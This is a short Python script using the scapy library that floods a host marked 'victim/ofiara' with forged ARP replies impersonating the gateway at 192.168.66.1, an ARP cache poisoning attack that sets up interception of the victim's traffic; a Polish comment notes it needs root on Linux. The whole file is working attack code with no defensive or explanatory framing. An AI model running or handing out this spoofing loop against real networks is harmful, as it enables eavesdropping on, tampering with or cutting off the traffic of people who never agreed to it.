from scapy.all import ARP, send
import time

while True:
    arp_response = ARP(
        pdst="192.168.66.102", # victim/ofiara
        hwdst="44:6d:57:d0:82:1d",
        psrc="192.168.66.1",
        op="is-at")
    send(arp_response, verbose=0)
    time.sleep(1)


"""
potrzebmy jest root na linuxie bo tylko na linusie to dziala


"""


















